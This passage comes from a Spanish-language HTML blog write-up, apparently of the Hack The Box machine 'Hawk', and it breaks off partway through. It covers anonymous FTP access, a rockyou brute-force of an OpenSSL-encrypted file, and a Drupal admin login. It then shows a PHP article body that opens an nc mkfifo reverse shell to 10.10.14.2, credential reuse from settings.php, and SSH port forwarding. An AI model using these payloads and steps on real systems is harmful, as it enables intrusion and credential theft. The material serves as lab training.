+SF:i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
+SF:0a</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">,</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\</span><span class="s2">
+SF:x20</span><span class="se">\0</span><span class="s2">-</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">A</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">O</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0\[\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">000</span><span class="se">\x</span><span class="s2">0
+SF:01</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\0</span><span class="s2">-</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">006</span><span class="se">\0\]\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\</span><span class="s2">
+SF:x002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\</span><span class="s2">
+SF:0g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">J</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">S</span><span class="se">\0</span><span class="s2">Q</span><span class="se">\0</span><span class="s2">L</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">
+SF:x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">003</span><span class="se">\x</span><span class="s2">004</span><span class="se">\x</span><span class="s2">005</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a
+SF:</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x
+SF:</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n
+SF:</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\x</span><span class="s2">009</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.</span><span class="s2">
+SF:</span><span class="se">\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\</span><span class="s2">
+SF:0</span><span class="se">\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">0
+SF:01</span><span class="se">\x</span><span class="s2">005</span><span class="se">\x</span><span class="s2">005</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\</span><span class="s2">
+SF:0s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b
+SF:</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">004</span><span class="se">\x</span><span class="s2">004</span><span class="se">\0\)\0\n\0</span><span class="s2">
+SF:</span><span class="se">\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r"</span><span class="o">)</span><span class="p">;</span>
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>17.66 seconds
+</code></pre></div></div>
+
+<p>Vamos a empezar con el análisis, primeramente por el puerto 21 asociado al servicio <strong>FTP</strong>, por lo que intentamos conectarnos como el usuario <em>anonymous</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.102
+Connected to 10.10.10.102.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.102:k4miyo<span class="o">)</span>: anonymous
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt;
+</code></pre></div></div>
+
+<p>Una vez conectados, vemos un directorio denominado <code class="language-plaintext highlighter-rouge">messages</code>, ingresamos a este y vemos que “no tiene contenido”; sin embargo, ocupamos el comando <code class="language-plaintext highlighter-rouge">ls -la</code> para listar posibles archivos ocultos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 <span class="nb">.</span>
+drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
+226 Directory send OK.
+ftp&gt;
+</code></pre></div></div>
+
+<p>Vemos el recurso <code class="language-plaintext highlighter-rouge">.drupal.txt.enc</code>, por lo que lo traemos a nuestro equipo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; get .drupal.txt.enc
+<span class="nb">local</span>: .drupal.txt.enc remote: .drupal.txt.enc
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for</span> .drupal.txt.enc <span class="o">(</span>240 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+240 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>3.3659 MB/s<span class="o">)</span>
+ftp&gt;
+</code></pre></div></div>
+
+<p>Una vez en nuestro equipo, le echamos un ojo al contenido del archivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>drupal.txt.enc
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: drupal.txt.enc
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
+   2   │ CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
+   3   │ QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
+   4   │ <span class="nv">t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk</span><span class="o">=</span>
+</code></pre></div></div>
+
+<p>Vemos que se encuentra en <strong>base64</strong>, por lo que lo decodificamos y lo guardamos a un archivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>drupal.txt.enc | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> message.crypted
+❯ <span class="nb">cat </span>message.crypted
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: message.crypted   &lt;BINARY&gt;
+❯ file message.crypted
+message.crypted: openssl enc<span class="s1">'d data with salted password
+</span></code></pre></div></div>
+
+<p>Al tratar de visualizar nuestro archivos, vemos que la información se encuentra cifrada, por lo que procedemos a realizar un <em>script</em> para descifrar el archivo a partir del direccionario <strong>rockyou.txt</strong> (<code class="language-plaintext highlighter-rouge">/usr/share/wordlist/rockyou.txt</code>) y la función <code class="language-plaintext highlighter-rouge">openssl</code>. Para este caso, se buscó la frase <em>openssl enc’d data with salted password</em> y se obtuvo como resultado el siguiente link, por lo que vamos a suponer el uso de `
+aes-256-cbc`:</p>
+
+<p><a href="https://newbedev.com/how-to-use-openssl-to-encrypt-decrypt-files">newbedev</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="c">#encoding: utf-8</span>
+
+<span class="c"># Ctrl + c</span>
+<span class="k">function </span>ctrl_c<span class="o">(){</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[!] Saliendo..."</span>
+	<span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="nb">trap </span>ctrl_c INT
+
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-ne</span> 2 <span class="o">]</span><span class="p">;</span> <span class="k">then
+	</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Uso:"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="nv">$0</span><span class="s2"> &lt;message.encrypted&gt; &lt;message.decrypted&gt;"</span>
+	<span class="nb">exit </span>1
+<span class="k">fi
+
+while </span><span class="nb">read </span>password<span class="p">;</span> <span class="k">do
+	</span>openssl aes-256-cbc <span class="nt">-d</span> <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-out</span> <span class="nv">$2</span> <span class="nt">-k</span> <span class="nv">$password</span> 2&gt;/dev/null
+	<span class="k">if</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$?</span><span class="si">)</span> <span class="o">==</span> <span class="s2">"0"</span> <span class="o">]</span><span class="p">;</span><span class="k">then
+		</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] La contraseña es: </span><span class="nv">$password</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">cat</span> <span class="nv">$2</span>
+		<span class="nb">break
+	</span><span class="k">fi
+done</span> &lt; /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>Al darle permisos de ejecución al archivo <code class="language-plaintext highlighter-rouge">chmod +x decrypter.sh</code> y ejecutarlo, obtenemos el siguiente resultado:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./decrypter.sh message.crypted message.decrypted
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> La contraseña es: friends
+Daniel,
+
+Following the password <span class="k">for </span>the portal:
+
+PencilKeyboardScanner123
+
+Please <span class="nb">let </span>us know when the portal is ready.
+
+Kind Regards,
+
+IT department
+</code></pre></div></div>
+
+<p>En el mensaje observamos un mensaje para el usuario <strong>Daniel</strong> en donde se le comparte la contraseña del portal; por lo tanto ingresamos a través del protocolo HTTP y utilizamos la credenciales <em>admin:PencilKeyboardScanner123</em>:</p>
+
+<ul>
+  <li>http://10.10.10.102/</li>
+</ul>
+
+<p><img src="/assets/images/htb-hawk/hawk_panel.jpg" alt="" /></p>
+
+<p><img src="/assets/images/htb-hawk/hawk_login.jpg" alt="" /></p>
+
+<p>Una vez dentro del panel de administración de la tecnología <strong>Drupal 7</strong>, accedemos al apartados de <strong><em>Modules</em></strong> en la parte superior y habilitamos la opción <strong><em>PHP filter</em></strong>. Por útlimo guardamos los cambios.</p>
+
+<p><img src="/assets/images/htb-hawk/hawk_modules.jpg" alt="" /></p>
+
+<p>Ahora le damos click al icono de <em>Home</em> en la parte superior y seleccionamos al opción <strong><em>Add new content</em></strong>, seleccionamos <strong><em>Article</em></strong> y llenamos los siguientes campos:</p>
+<ul>
+  <li>Title: Reverse shell</li>
+  <li>Tags: k4mishell</li>
+  <li>Body:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+  system<span class="o">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 443 &gt;/tmp/f"</span><span class="o">)</span>
+?&gt;
+</code></pre></div>    </div>
+  </li>
+  <li>Text format: PHP code</li>
+</ul>
+
+<p>Nos ponemos en escucha a través del puerto 443 y guardamos los cambios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.102] 41610
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+</span></code></pre></div></div>
+
+<p>Realizamos un <a href="/tratamiento-tty">Tratamiento de la tty</a> y observamos que nos escontramos dentro de la máquina víctima como el usuario <code class="language-plaintext highlighter-rouge">www-data</code>; ahora podemos visualizar la flag (user.txt). Para escalar privilegios, debemos tener en cuenta que se encuentra abierto el puerto 8082 asociado al servicio <strong>H2 Console</strong>.</p>
+
+<p><img src="/assets/images/htb-hawk/hawk_h2console.jpg" alt="" /></p>
+
+<p>Primeramente, validamos si el puerto 8082 está corriendo dentro de la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/<span class="nv">$ </span>netstat <span class="nt">-nat</span> | <span class="nb">grep </span>8082
+tcp6       0      0 :::8082                 :::<span class="k">*</span>                    LISTEN     
+tcp6       0      0 10.10.10.102:8082       10.10.14.2:55896        ESTABLISHED
+www-data@hawk:/<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Ahora, mediante <code class="language-plaintext highlighter-rouge">curl</code> probaremos si podemos visualizar contenido diferente que al que observamos vía web:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/<span class="nv">$ </span>curl http://localhost:8082
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/html4/loose.dtd"</span><span class="o">&gt;</span>
+&lt;<span class="o">!</span><span class="nt">--</span>
+Copyright 2004-2014 H2 Group. Multiple-Licensed under the MPL 2.0,
+and the EPL 1.0 <span class="o">(</span>http://h2database.com/html/license.html<span class="o">)</span><span class="nb">.</span>
+Initial Developer: H2 Group
+<span class="nt">--</span><span class="o">&gt;</span>
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
+    &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html;charset=utf-8"</span> /&gt;
+    &lt;title&gt;H2 Console&lt;/title&gt;
+    &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"stylesheet.css"</span> /&gt;
+&lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">"text/javascript"</span><span class="o">&gt;</span>
+location.href <span class="o">=</span> <span class="s1">'login.jsp?jsessionid=a44a652e203c2092aa2e956117ab47a7'</span><span class="p">;</span>
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body <span class="nv">style</span><span class="o">=</span><span class="s2">"margin: 20px;"</span><span class="o">&gt;</span>
+
+&lt;h1&gt;Welcome to H2&lt;/h1&gt;
+&lt;h2&gt;No Javascript&lt;/h2&gt;
+If you are not automatically redirected to the login page, <span class="k">then
+</span>Javascript is currently disabled or your browser does not support Javascript.
+For this application to work, Javascript is essential.
+Please <span class="nb">enable </span>Javascript now, or use another web browser that supports it.
+
+&lt;/body&gt;&lt;/html&gt;
+www-data@hawk:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Como podemos observar, el contenido es diferente, por lo que debemos estar pensando en hacer un <em>Remote/Local Port Forwarding</em>. Para este caso utilizaremos un <em>Local Port Forwarding</em> porque debido a unas políticas de la plataforma, no te permite realizar <em>Remote Port Forwarding</em>. Podemos consultar información información en la siguiente liga:</p>
+
+<p><a href="https://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/">booleanworld</a></p>
+
+<p>Para realizar el <em>Local Port Forwarding</em> necesitamos credenciales válidas de acceso por el puerto <code class="language-plaintext highlighter-rouge">ssh</code>, por lo que sabemos que un usuario potencia es <strong>daniel</strong>, ahora tenemos que encontrar la contraseña de dicho usuario. Investigando un poco, encontramos el recurso <code class="language-plaintext highlighter-rouge">/var/www/html/sites/default/settings.php</code> y se observan unas posibles credenciales de acceso</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/var/www/html/sites/default<span class="nv">$ </span><span class="nb">cat </span>settings.php | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-E</span> <span class="s2">"username|password"</span>
+ <span class="k">*</span>   <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span>,
+ <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
+ <span class="k">*</span> username, password, host, and database name.
+ <span class="k">*</span>   <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span>,
+ <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
+ <span class="k">*</span>   <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span>,
+ <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
+ <span class="k">*</span>     <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span>,
+ <span class="k">*</span>     <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
+ <span class="k">*</span>     <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span>,
+ <span class="k">*</span>     <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
+      <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'drupal'</span>,
+      <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'drupal4hawk'</span>,
+ <span class="k">*</span> by using the username and password variables. The proxy_user_agent variable
+<span class="c"># $conf['proxy_username'] = '';</span>
+<span class="c"># $conf['proxy_password'] = '';</span>
+www-data@hawk:/var/www/html/sites/default<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ahora probaremos las credenciales <em>“daniel:drupal4hawk”</em> en el servicio <strong>ssh</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh daniel@10.10.10.102
+daniel@10.10.10.102<span class="s1">'s password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Sep 17 06:14:20 UTC 2021
+
+  System load:  0.0               Processes:           173
+  Usage of /:   47.5% of 7.32GB   Users logged in:     0
+  Memory usage: 58%               IP address for eth0: 10.10.10.102
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+417 packages can be updated.
+268 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Sep 17 06:02:50 2021 from 10.10.14.2
+Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
+[GCC 7.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt;
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.system("/bin/bash")
+daniel@hawk:~$ whoami
+daniel
+daniel@hawk:~$
+</span></code></pre></div></div>
+
+<p>Contamos con credenciales válidas de acceso por <strong>ssh</strong>; ahora en nuestra máquina de atacante, procedemos a realizar un <em>Local Port Forwarding</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-L</span> 4646:127.0.0.1:8082 daniel@10.10.10.102
+daniel@10.10.10.102<span class="s1">'s password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Sep 17 06:20:25 UTC 2021
+
+  System load:  0.01              Processes:           173
+  Usage of /:   47.5% of 7.32GB   Users logged in:     0
+  Memory usage: 58%               IP address for eth0: 10.10.10.102
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+417 packages can be updated.
+268 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Sep 17 06:14:21 2021 from 10.10.14.2
+Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
+[GCC 7.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt;
+</span></code></pre></div></div>
+
+<p>Vemos el puerto 4646 abierto en nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ lsof <span class="nt">-i</span> | <span class="nb">grep </span>4646
